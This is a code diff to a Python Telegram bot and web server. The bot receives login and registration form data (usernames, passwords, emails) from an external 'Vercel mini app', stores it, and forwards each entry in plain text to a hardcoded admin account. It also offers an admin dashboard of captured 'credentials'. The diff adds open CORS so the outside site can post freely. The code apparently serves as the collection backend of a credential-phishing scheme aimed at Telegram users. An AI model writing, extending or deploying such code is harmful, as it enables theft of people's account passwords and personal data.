@@ -9,7 +9,6 @@ TOKEN = os.getenv("BOT_TOKEN")
 ADMIN_ID = int(os.getenv("ADMIN_ID", "8631580614"))
 PORT = int(os.getenv("PORT", 10000))
 
-# Initialize bot and dispatcher
 bot = Bot(token=TOKEN)
 dp = Dispatcher(bot)
 
@@ -37,7 +36,7 @@ async def send_welcome(message: types.Message):
         entry = {
             "sr": sr_no,
             "category": "BOT START EVENT",
-            "status": "Bot Opened (No Site Visit Yet)",
+            "status": "Bot Opened",
             "name": user.full_name,
             "username": f"@{user.username}" if user.username else "N/A",
             "id": str(user.id),
@@ -51,7 +50,7 @@ async def send_welcome(message: types.Message):
             },
             "time": message.date.strftime('%d %b %Y, %I:%M:%S %p')
         }
-        LIFETIME_USER_LOGS.insert(0, entry) # Latest on top
+        LIFETIME_USER_LOGS.insert(0, entry)
         
         try:
             await bot.send_message(
@@ -62,11 +61,10 @@ async def send_welcome(message: types.Message):
         except Exception as e:
             print(e)
 
-# Secure Admin Command: /admin_ZAROPLAYisFINAL
 @dp.message_handler(commands=['admin_ZAROPLAYisFINAL'])
 async def admin_panel(message: types.Message):
     if message.from_user.id != ADMIN_ID:
-        return  # Strictly restricted to admin
+        return
 
     render_url = os.getenv("RENDER_EXTERNAL_URL", f"http://0.0.0.0:{PORT}")
     admin_panel_url = f"{render_url}/admin/dashboard"
@@ -77,74 +75,47 @@ async def admin_panel(message: types.Message):
 
     await message.reply(
         "🛠 **Admin Authentication Successful!**\n\n"
-        "Click the button below to launch your lightning-fast lifetime web dashboard containing all structured logs and credentials:",
+        "Click below to launch your web dashboard:",
         reply_markup=keyboard,
         parse_mode="Markdown"
     )
 
-# Handle general text messages as fallback
-@dp.message_handler(content_types=['text'])
-async def handle_user_submission(message: types.Message):
-    user = message.from_user
-    if user.id == ADMIN_ID:
-        return
-
-    text_data = message.text
-    sr_no = len(LIFETIME_USER_LOGS) + 1
-    
-    entry = {
-        "sr": sr_no,
-        "category": "DIRECT TEXT SUBMISSION",
-        "status": "Received Text",
-        "name": user.full_name,
-        "username": f"@{user.username}" if user.username else "N/A",
-        "id": str(user.id),
-        "fields": {
-            "Message Data": text_data
-        },
-        "time": message.date.strftime('%d %b %Y, %I:%M:%S %p')
-    }
-    LIFETIME_USER_LOGS.insert(0, entry)
-
-    try:
-        await bot.send_message(
-            ADMIN_ID, 
-            f"🚨 **Text Received [No. {sr_no}]**\n- User: {user.full_name}\n- Data: {text_data}", 
-            parse_mode="Markdown"
-        )
-    except Exception as e:
-        print(e)
-
-
-# ==========================================
-# WEB SERVER & API ENDPOINT FOR VERCEL MINI APP
-# ==========================================
 async def handle_root(request):
     return web.Response(text="Bot and API Server are online and running 24/7!")
 
 # API Endpoint to receive precise Login / Register credentials from Vercel website
 async def handle_api_submit(request):
+    # Enable CORS headers so Vercel can talk to Render without restriction
+    headers = {
+        "Access-Control-Allow-Origin": "*",
+        "Access-Control-Allow-Methods": "POST, OPTIONS",
+        "Access-Control-Allow-Headers": "Content-Type"
+    }
+
+    if request.method == "OPTIONS":
+        return web.Response(status=200, headers=headers)
+
     try:
         data = await request.json()
+        print("RECEIVED DATA FROM VERCEL:", data) # Print in Render logs to debug
+        
         user_id = str(data.get("telegram_id", "Unknown"))
         username = data.get("username", "N/A")
         name = data.get("name", "Unknown User")
-        action_type = data.get("action", "LOGIN").upper() # LOGIN or REGISTER
+        action_type = data.get("action", "LOGIN").upper()
         status = data.get("status", "Successful")
-        form_fields = data.get("form_fields", {}) # Dictionary of credentials (username, password, email, etc.)
+        form_fields = data.get("form_fields", {})
         ip_address = request.headers.get("X-Forwarded-For", request.remote or "127.0.0.1")
         user_agent = request.headers.get("User-Agent", "Unknown Browser")
 
         sr_no = len(LIFETIME_USER_LOGS) + 1
         
-        # Combine user info and form fields cleanly
         fields_dict = {
             "Action Status": status,
             "Telegram Name": name,
             "Telegram Username": f"@{username}" if not username.startswith("@") else username,
             "Telegram ID": user_id
         }
-        # Add all submitted form fields (username, password, email, confirm password, etc.)
         for key, val in form_fields.items():
             fields_dict[key] = val
 
@@ -163,18 +134,17 @@ async def handle_api_submit(request):
         }
         LIFETIME_USER_LOGS.insert(0, entry)
 
-        # Instant alert to Admin inbox
         alert_text = f"🔥 **Mini App {action_type} ({status})**\n- Name: {name}\n- ID: `{user_id}`\n"
         for k, v in form_fields.items():
-            alert_text += f"- {k}: {v}\n"
+            alert_text += f"- {k}: `{v}`\n"
 
         await bot.send_message(ADMIN_ID, alert_text, parse_mode="Markdown")
 
-        return web.json_response({"status": "success", "message": "Structured data saved successfully"})
+        return web.json_response({"status": "success", "message": "Saved successfully"}, headers=headers)
     except Exception as e:
-        return web.json_response({"status": "error", "error": str(e)}, status=400)
+        print("API ERROR:", str(e))
+        return web.json_response({"status": "error", "error": str(e)}, status=400, headers=headers)
 
-# Ultra-Fast HTML Admin Dashboard with Key-Value Cards
 async def handle_admin_dashboard(request):
     logs_html = ""
     if LIFETIME_USER_LOGS:
@@ -201,7 +171,7 @@ async def handle_admin_dashboard(request):
             </div>
             """
     else:
-        logs_html = "<div class='no-data'>No logs or records captured yet. Waiting for user activities...</div>"
+        logs_html = "<div class='no-data'>No logs captured yet. Waiting for activities...</div>"
 
     html_content = f"""
     <!DOCTYPE html>
@@ -319,17 +289,17 @@ async def handle_admin_dashboard(request):
 
         <script>
             let tg = window.Telegram.WebApp;
-            tg.expand(); // Expands web app to full screen instantly
+            tg.expand();
         </script>
     </body>
     </html>
     """
     return web.Response(text=html_content, content_type='text/html')
 
-
 app = web.Application()
 app.router.add_get('/', handle_root)
 app.router.add_post('/api/submit', handle_api_submit)
+app.router.add_options('/api/submit', handle_api_submit) # Handle CORS preflight
 app.router.add_get('/admin/dashboard', handle_admin_dashboard)
 
 async def on_startup(dispatcher):
@@ -340,4 +310,4 @@ async def on_startup(dispatcher):
 
 if __name__ == '__main__':
     executor.start_polling(dp, skip_updates=True, on_startup=on_startup)
-            
+    
